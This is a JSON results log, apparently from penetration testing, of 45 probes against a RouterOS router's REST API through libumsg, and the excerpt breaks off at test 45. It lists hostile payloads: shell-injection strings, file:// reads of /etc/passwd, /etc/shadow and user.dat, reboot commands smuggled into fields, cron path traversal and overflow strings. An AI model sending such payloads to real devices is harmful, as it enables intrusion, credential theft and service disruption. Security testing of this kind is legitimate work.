@@ -1,0 +1,2067 @@
+{
+  "metadata": {
+    "script": "attack_libumsg_indirect.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": 9,
+    "start_time": "2026-02-16T15:14:37.233882",
+    "end_time": "2026-02-16T15:16:47.953256",
+    "total_tests": 120,
+    "anomalies": 0,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "3h15m15s",
+    "library_info": {
+      "name": "libumsg.so",
+      "dangerous_imports": [
+        "execve",
+        "sprintf",
+        "strcpy",
+        "realpath"
+      ],
+      "role": "IPC backbone for ALL RouterOS services",
+      "attack_strategy": "Indirect via REST API and RouterOS API protocol"
+    },
+    "crash_count": 0,
+    "crash_detected": false,
+    "final_log_matches": 76,
+    "final_log_sample": [
+      "{'.id': '*25D', 'extra-info': '', 'message': 'changed system note settings by api:admin@:: (/system note set note=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*25E', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)', 'time': '2026-02-16 21:47:04', 'topics': 'system,info'}",
+      "{'.id': '*25F', 'extra-info': '', 'message': 'changed system note settings by api:admin@:: (/system note set note=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*260', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*261', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*262', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*263', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*264', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*265', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*266', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*267', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*268', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*269', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)', 'time': '2026-02-16 21:47:04', 'topics': 'system,info'}",
+      "{'.id': '*426', 'extra-info': '', 'message': 'changed system note settings by api:admin@:: (/system note set note=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*427', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*428', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*429', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*42A', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*42B', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]",
+      "{'.id': '*42C', 'extra-info': '', 'message': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1129 chars]"
+    ],
+    "router_log_count": 1000,
+    "router_interesting_events": 62,
+    "final_health": {
+      "alive": true,
+      "uptime": "3h17m34s",
+      "cpu_load": "100",
+      "free_memory": "825802752",
+      "version": "7.20.8 (long-term)"
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: shell_semicolon",
+      "description": "POST /tool/fetch with URL containing shell metachar: http://127.0.0.1/;whoami",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:38.482506",
+      "details": {
+        "url": "http://127.0.0.1/;whoami",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m15s",
+        "post_uptime": "3h15m16s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 2,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: shell_pipe",
+      "description": "POST /tool/fetch with URL containing shell metachar: http://127.0.0.1/|id",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:39.787158",
+      "details": {
+        "url": "http://127.0.0.1/|id",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m16s",
+        "post_uptime": "3h15m17s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 3,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: shell_ampersand",
+      "description": "POST /tool/fetch with URL containing shell metachar: http://127.0.0.1/&&id",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:40.103316",
+      "details": {
+        "url": "http://127.0.0.1/&&id",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m18s",
+        "post_uptime": "3h15m18s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 4,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: shell_backtick",
+      "description": "POST /tool/fetch with URL containing shell metachar: http://127.0.0.1/`id`",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:41.427978",
+      "details": {
+        "url": "http://127.0.0.1/`id`",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m18s",
+        "post_uptime": "3h15m19s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 5,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: shell_subshell",
+      "description": "POST /tool/fetch with URL containing shell metachar: http://127.0.0.1/$(id)",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:42.740634",
+      "details": {
+        "url": "http://127.0.0.1/$(id)",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m19s",
+        "post_uptime": "3h15m20s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 6,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: file_proto_passwd",
+      "description": "POST /tool/fetch with URL containing shell metachar: file:///etc/passwd",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:43.052790",
+      "details": {
+        "url": "file:///etc/passwd",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m21s",
+        "post_uptime": "3h15m21s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 7,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: file_proto_shadow",
+      "description": "POST /tool/fetch with URL containing shell metachar: file:///etc/shadow",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:43.364946",
+      "details": {
+        "url": "file:///etc/shadow",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m21s",
+        "post_uptime": "3h15m21s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 8,
+      "category": "cmd_exec_fetch",
+      "name": "fetch URL injection: file_proto_userdat",
+      "description": "POST /tool/fetch with URL containing shell metachar: file:///flash/rw/store/user.dat",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:43.681104",
+      "details": {
+        "url": "file:///flash/rw/store/user.dat",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "pre_uptime": "3h15m21s",
+        "post_uptime": "3h15m21s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 9,
+      "category": "cmd_exec_script",
+      "name": "script injection: backtick_name",
+      "description": "Add script with injection payload in name/source",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:43.993260",
+      "details": {
+        "payload_name": "backtick_name",
+        "data": {
+          "name": "_test_`id`",
+          "source": ":log info ok"
+        },
+        "status": 200,
+        "response": "{'ret': '*1'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 10,
+      "category": "cmd_exec_script",
+      "name": "script injection: subshell_source",
+      "description": "Add script with injection payload in name/source",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:44.309418",
+      "details": {
+        "payload_name": "subshell_source",
+        "data": {
+          "name": "_test_subsh",
+          "source": "$(id)"
+        },
+        "status": 200,
+        "response": "{'ret': '*2'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 11,
+      "category": "cmd_exec_script",
+      "name": "script injection: pipe_source",
+      "description": "Add script with injection payload in name/source",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:44.617572",
+      "details": {
+        "payload_name": "pipe_source",
+        "data": {
+          "name": "_test_pipe",
+          "source": "|cat /etc/passwd"
+        },
+        "status": 200,
+        "response": "{'ret': '*3'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 12,
+      "category": "cmd_exec_script",
+      "name": "script injection: semicolon_source",
+      "description": "Add script with injection payload in name/source",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:44.925726",
+      "details": {
+        "payload_name": "semicolon_source",
+        "data": {
+          "name": "_test_semi",
+          "source": ";/system/reboot"
+        },
+        "status": 200,
+        "response": "{'ret': '*4'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 13,
+      "category": "cmd_exec_script",
+      "name": "script injection: newline_source",
+      "description": "Add script with injection payload in name/source",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:45.233880",
+      "details": {
+        "payload_name": "newline_source",
+        "data": {
+          "name": "_test_nl",
+          "source": ":log info safe\n/system/reboot"
+        },
+        "status": 200,
+        "response": "{'ret': '*5'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 14,
+      "category": "cmd_exec_export",
+      "name": "export filename injection: traversal",
+      "description": "POST /export with crafted filename: '../../etc/cron.d/evil'",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:45.582054",
+      "details": {
+        "filename": "'../../etc/cron.d/evil'",
+        "status": 400,
+        "response": "{'detail': 'invalid file name', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 15,
+      "category": "cmd_exec_export",
+      "name": "export filename injection: semicolon",
+      "description": "POST /export with crafted filename: 'test;id'",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:48.111318",
+      "details": {
+        "filename": "'test;id'",
+        "status": 200,
+        "response": "",
+        "crashed": false
+      }
+    },
+    {
+      "id": 16,
+      "category": "cmd_exec_export",
+      "name": "export filename injection: null_truncate",
+      "description": "POST /export with crafted filename: 'safe\\x00.rsc'",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:48.567546",
+      "details": {
+        "filename": "'safe\\x00.rsc'",
+        "status": 200,
+        "response": "",
+        "crashed": false
+      }
+    },
+    {
+      "id": 17,
+      "category": "cmd_exec_fields",
+      "name": "field injection: identity_semicolon",
+      "description": "POST /system/identity/set with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:48.879702",
+      "details": {
+        "payload_name": "identity_semicolon",
+        "method": "POST",
+        "path": "/system/identity/set",
+        "data": {
+          "name": "'test;id'"
+        },
+        "status": 200,
+        "response": "",
+        "crashed": false
+      }
+    },
+    {
+      "id": 18,
+      "category": "cmd_exec_fields",
+      "name": "field injection: identity_subshell",
+      "description": "POST /system/identity/set with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:49.191858",
+      "details": {
+        "payload_name": "identity_subshell",
+        "method": "POST",
+        "path": "/system/identity/set",
+        "data": {
+          "name": "'test$(whoami)'"
+        },
+        "status": 200,
+        "response": "",
+        "crashed": false
+      }
+    },
+    {
+      "id": 19,
+      "category": "cmd_exec_fields",
+      "name": "field injection: identity_backtick",
+      "description": "POST /system/identity/set with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:49.504014",
+      "details": {
+        "payload_name": "identity_backtick",
+        "method": "POST",
+        "path": "/system/identity/set",
+        "data": {
+          "name": "'test`uname`'"
+        },
+        "status": 200,
+        "response": "",
+        "crashed": false
+      }
+    },
+    {
+      "id": 20,
+      "category": "cmd_exec_fields",
+      "name": "field injection: firewall_comment_sub",
+      "description": "POST /ip/firewall/filter/add with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:52.101312",
+      "details": {
+        "payload_name": "firewall_comment_sub",
+        "method": "POST",
+        "path": "/ip/firewall/filter/add",
+        "data": {
+          "chain": "'forward'",
+          "action": "'accept'",
+          "comment": "'$(cat /etc/passwd)'"
+        },
+        "status": 200,
+        "response": "{'ret': '*1'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 21,
+      "category": "cmd_exec_fields",
+      "name": "field injection: firewall_comment_pipe",
+      "description": "POST /ip/firewall/filter/add with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:52.417470",
+      "details": {
+        "payload_name": "firewall_comment_pipe",
+        "method": "POST",
+        "path": "/ip/firewall/filter/add",
+        "data": {
+          "chain": "'forward'",
+          "action": "'accept'",
+          "comment": "'test|id'"
+        },
+        "status": 200,
+        "response": "{'ret': '*2'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 22,
+      "category": "cmd_exec_fields",
+      "name": "field injection: interface_name_semi",
+      "description": "PATCH /interface/ether1 with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:52.733628",
+      "details": {
+        "payload_name": "interface_name_semi",
+        "method": "PATCH",
+        "path": "/interface/ether1",
+        "data": {
+          "comment": "';/system/reboot'"
+        },
+        "status": 200,
+        "response": "{'.id': '*2', 'actual-mtu': '1500', 'comment': ';/system/reboot', 'default-name': 'ether1', 'disabled': 'false', 'fp-rx-byte': '0', 'fp-rx-packet': '0', 'fp-tx-byte': '0', 'fp-tx-packet': '0', 'last-link-up-time': '2026-02-16 19:39:24', 'link-downs': '0', 'mac-address': '08:00:27:66:C5:41', 'mtu': '1500', 'name': 'ether1', 'running': 'true', 'rx-byte': '16330447', 'rx-drop': '0', 'rx-error': '0', 'rx-packet': '96631', 'tx-byte': '27402512', 'tx-drop': '0', 'tx-error': '0', 'tx-packet': '30105', ... [truncated, total 538 chars]",
+        "crashed": false
+      }
+    },
+    {
+      "id": 23,
+      "category": "cmd_exec_fields",
+      "name": "field injection: scheduler_onevent",
+      "description": "POST /system/scheduler/add with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:53.045784",
+      "details": {
+        "payload_name": "scheduler_onevent",
+        "method": "POST",
+        "path": "/system/scheduler/add",
+        "data": {
+          "name": "'_test_sched_inj'",
+          "on-event": "'$(id)'",
+          "interval": "'99d'"
+        },
+        "status": 200,
+        "response": "{'ret': '*0'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 24,
+      "category": "cmd_exec_fields",
+      "name": "field injection: queue_name_inject",
+      "description": "POST /queue/simple/add with shell metacharacters",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:53.357940",
+      "details": {
+        "payload_name": "queue_name_inject",
+        "method": "POST",
+        "path": "/queue/simple/add",
+        "data": {
+          "name": "'_test_q_`id`'",
+          "target": "'0.0.0.0/0'"
+        },
+        "status": 200,
+        "response": "{'ret': '*1'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 25,
+      "category": "cmd_exec_fields",
+      "name": "field injection: package_source_url",
+      "description": "POST /system/package/update/set with shell metacharacters",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:53.722122",
+      "details": {
+        "payload_name": "package_source_url",
+        "method": "POST",
+        "path": "/system/package/update/set",
+        "data": {
+          "channel": "'testing;id'"
+        },
+        "status": 400,
+        "response": "{'detail': 'input does not match any value of channel', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 26,
+      "category": "overflow_identity",
+      "name": "identity name 64KB",
+      "description": "Set system identity to 64KB string of 'A's",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:54.026274",
+      "details": {
+        "size": 65536,
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "pre_uptime": "3h15m32s",
+        "post_uptime": "3h15m32s"
+      }
+    },
+    {
+      "id": 27,
+      "category": "overflow_identity",
+      "name": "identity name 256KB",
+      "description": "Set system identity to 256KB string of 'A's",
+      "result": "HTTP 413, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:54.538530",
+      "details": {
+        "size": 262144,
+        "status": 413,
+        "response": "{'error': 413, 'message': 'Payload Too Large'}",
+        "crashed": false,
+        "pre_uptime": "3h15m32s",
+        "post_uptime": "3h15m32s"
+      }
+    },
+    {
+      "id": 28,
+      "category": "overflow_identity",
+      "name": "identity name 512KB",
+      "description": "Set system identity to 512KB string of 'A's",
+      "result": "HTTP 413, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:55.058790",
+      "details": {
+        "size": 524288,
+        "status": 413,
+        "response": "{'error': 413, 'message': 'Payload Too Large'}",
+        "crashed": false,
+        "pre_uptime": "3h15m33s",
+        "post_uptime": "3h15m33s"
+      }
+    },
+    {
+      "id": 29,
+      "category": "overflow_identity",
+      "name": "identity name 1MB",
+      "description": "Set system identity to 1MB string of 'A's",
+      "result": "HTTP 413, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:55.571046",
+      "details": {
+        "size": 1048576,
+        "status": 413,
+        "response": "{'error': 413, 'message': 'Payload Too Large'}",
+        "crashed": false,
+        "pre_uptime": "3h15m33s",
+        "post_uptime": "3h15m33s"
+      }
+    },
+    {
+      "id": 30,
+      "category": "overflow_comments",
+      "name": "oversized firewall_comment (64KB)",
+      "description": "Create object with 64KB string in firewall_comment",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:56.103312",
+      "details": {
+        "target": "firewall_comment",
+        "field_size": 65536,
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 31,
+      "category": "overflow_comments",
+      "name": "oversized address_comment (64KB)",
+      "description": "Create object with 64KB string in address_comment",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:56.419470",
+      "details": {
+        "target": "address_comment",
+        "field_size": 65536,
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 32,
+      "category": "overflow_comments",
+      "name": "oversized script_name (64KB)",
+      "description": "Create object with 64KB string in script_name",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:56.735628",
+      "details": {
+        "target": "script_name",
+        "field_size": 65536,
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 33,
+      "category": "overflow_comments",
+      "name": "oversized scheduler_name (64KB)",
+      "description": "Create object with 64KB string in scheduler_name",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:57.067780",
+      "details": {
+        "target": "scheduler_name",
+        "field_size": 65536,
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 34,
+      "category": "overflow_comments",
+      "name": "oversized queue_name (64KB)",
+      "description": "Create object with 64KB string in queue_name",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:57.427600",
+      "details": {
+        "target": "queue_name",
+        "field_size": 65536,
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 35,
+      "category": "overflow_boundary",
+      "name": "boundary size 255",
+      "description": "Create script with source length=255 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:57.743442",
+      "details": {
+        "size": 255,
+        "status": 200,
+        "response": "{'ret': '*6'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 36,
+      "category": "overflow_boundary",
+      "name": "boundary size 256",
+      "description": "Create script with source length=256 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:57.951338",
+      "details": {
+        "size": 256,
+        "status": 200,
+        "response": "{'ret': '*7'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 37,
+      "category": "overflow_boundary",
+      "name": "boundary size 511",
+      "description": "Create script with source length=511 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:58.159234",
+      "details": {
+        "size": 511,
+        "status": 200,
+        "response": "{'ret': '*8'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 38,
+      "category": "overflow_boundary",
+      "name": "boundary size 512",
+      "description": "Create script with source length=512 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:58.371128",
+      "details": {
+        "size": 512,
+        "status": 200,
+        "response": "{'ret': '*9'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 39,
+      "category": "overflow_boundary",
+      "name": "boundary size 1023",
+      "description": "Create script with source length=1023 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:58.630998",
+      "details": {
+        "size": 1023,
+        "status": 200,
+        "response": "{'ret': '*A'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 40,
+      "category": "overflow_boundary",
+      "name": "boundary size 1024",
+      "description": "Create script with source length=1024 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:58.838894",
+      "details": {
+        "size": 1024,
+        "status": 200,
+        "response": "{'ret': '*B'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 41,
+      "category": "overflow_boundary",
+      "name": "boundary size 4095",
+      "description": "Create script with source length=4095 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:59.058784",
+      "details": {
+        "size": 4095,
+        "status": 200,
+        "response": "{'ret': '*C'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 42,
+      "category": "overflow_boundary",
+      "name": "boundary size 4096",
+      "description": "Create script with source length=4096 (power-of-2 boundary test)",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:59.274676",
+      "details": {
+        "size": 4096,
+        "status": 200,
+        "response": "{'ret': '*D'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 43,
+      "category": "overflow_nullbyte",
+      "name": "null byte: identity_null",
+      "description": "Send embedded null byte in identity_null field",
+      "result": "HTTP 200, crashed=False, null_truncated=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:59.490568",
+      "details": {
+        "name": "identity_null",
+        "status": 200,
+        "response": "",
+        "crashed": false,
+        "null_truncated": false
+      }
+    },
+    {
+      "id": 44,
+      "category": "overflow_nullbyte",
+      "name": "null byte: script_null",
+      "description": "Send embedded null byte in script_null field",
+      "result": "HTTP 200, crashed=False, null_truncated=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:59.710458",
+      "details": {
+        "name": "script_null",
+        "status": 200,
+        "response": "{'ret': '*E'}",
+        "crashed": false,
+        "null_truncated": false
+      }
+    },
+    {
+      "id": 45,
